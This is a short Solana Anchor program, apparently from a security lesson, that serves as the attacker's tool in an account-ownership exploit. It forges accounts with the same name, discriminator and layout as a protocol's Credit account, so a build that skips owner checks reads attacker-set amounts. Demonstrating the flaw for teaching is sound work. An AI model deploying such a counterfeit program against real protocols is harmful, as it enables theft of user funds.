//! prism_counterfeit — the attacker's tool, and half of lesson two.
//!
//! On Solana an account's data can only be written by the program that owns the
//! account. So an attacker who wants the protocol to read a number it never
//! authorised has to write that number somewhere — which means deploying
//! something like this.
//!
//! Nothing here is subtle, and that is the point. The struct below is *named*
//! `Credit`, so Anchor derives the same eight-byte discriminator the protocol
//! uses (`sha256("account:Credit")[0..8]`) and serialises the same layout. The
//! only thing that differs is **who owns the account** — and that is the one
//! thing the vulnerable build never asks about.
//!
//! This program is not part of the protocol. It exists because the attack needs
//! it to exist — deploying a program is something an attacker can simply do.

use anchor_lang::prelude::*;

declare_id!("AKW7vUPNvueeG31GV7gRCRtPQyvsmvat4RnzjPXjxiHR");

#[program]
pub mod prism_counterfeit {
    use super::*;

    /// Mint an account that looks exactly like a credit, owned by this program.
    pub fn forge(ctx: Context<Forge>, amount: u64) -> Result<()> {
        ctx.accounts.forged.amount = amount;
        Ok(())
    }
}

#[derive(Accounts)]
pub struct Forge<'info> {
    /// Owned by *this* program once `init` is done — which is the whole trick,
    /// and the whole reason the protocol must check.
    #[account(init, payer = payer, space = 8 + 8)]
    pub forged: Account<'info, Credit>,
    #[account(mut)]
    pub payer: Signer<'info>,
    pub system_program: Program<'info, System>,
}

/// Deliberately named and shaped like the protocol's account. Anchor hashes the
/// name to build the discriminator, so a shared name is a shared discriminator.
#[account]
pub struct Credit {
    pub amount: u64,
}
